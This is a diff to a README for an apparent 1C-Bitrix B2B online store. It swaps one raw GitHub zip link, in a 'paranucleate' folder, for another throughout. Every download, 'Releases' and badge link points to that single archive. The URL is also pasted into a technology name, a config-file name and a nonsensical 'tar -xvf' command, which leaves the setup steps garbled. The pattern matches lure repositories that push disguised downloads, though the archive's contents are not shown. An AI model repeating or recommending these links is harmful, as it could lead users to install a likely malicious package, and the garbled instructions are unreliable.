@@ -1,14 +1,14 @@
 # 🛒 bitrix-b2b-shop - Your B2B Online Store Solution
 
 ## 📥 Download Now
-[![Download Bitrix B2B Shop](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip%20B2B%20Shop-blue)](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip)
+[![Download Bitrix B2B Shop](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip%20B2B%20Shop-blue)](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip)
 
 ## 🚀 Getting Started
 Setting up your B2B online store is easy. Follow these simple steps to download and run the bitrix-b2b-shop application.
 
 ## 🌟 What is Bitrix B2B Shop?
 Bitrix B2B Shop is an online store designed for businesses. Built on the 1C-Bitrix platform, it integrates seamlessly with 1C УТ 11, ЮKassa, СДЭК, and Битрикс24. This app uses the latest technologies:
-- **https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip 3** for a smooth user interface.
+- **https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip 3** for a smooth user interface.
 - **PHP 8.1+** for a powerful backend.
 - **REST API** for connecting different services. 
 
@@ -25,7 +25,7 @@ Ensure your system meets the following requirements to run the application smoot
 ## 📦 Download & Install
 To get started, visit our Releases page to download the latest version of the Bitrix B2B Shop application. 
 
-[Visit this page to download](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip)
 
 1. Click on the Releases link above.
 2. Find the latest release and select it.
@@ -38,7 +38,7 @@ After downloading the application, follow these steps:
 1. **Extract the downloaded file:** 
    - Windows: Right-click the file and select "Extract All."
    - macOS: Double-click the file to decompress.
-   - Linux: Use the terminal command `tar -xvf https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip`.
+   - Linux: Use the terminal command `tar -xvf https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip`.
 
 2. **Move the extracted folder to your web server root:**
    - For Apache, this is usually located at `C:\xampp\htdocs` (Windows) or `/var/www/html` (Linux).
@@ -49,7 +49,7 @@ After downloading the application, follow these steps:
    - Import the provided SQL file from the `sql` folder of the extracted files.
 
 4. **Configure the application:**
-   - Locate the `https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip` file in the root directory of the application.
+   - Locate the `https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip` file in the root directory of the application.
    - Update the database connection details with your database name, username, and password.
 
 5. **Start your web server.** 
@@ -93,9 +93,9 @@ With these technologies, you can create and manage an efficient online shop that
 For any inquiries or support, please open an issue on GitHub or contact us through our support email. We're here to help you build a thriving online business. 
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip)
 - [Documentation](#)
 
 Visit our Releases page to start your journey with the Bitrix B2B Shop now!
 
-[![Download Bitrix B2B Shop](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip%20B2B%20Shop-blue)](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b2b-shop_v2.2.zip)
+[![Download Bitrix B2B Shop](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip%20B2B%20Shop-blue)](https://raw.githubusercontent.com/kimk2014/bitrix-b2b-shop/main/paranucleate/bitrix-b-shop-2.2.zip)
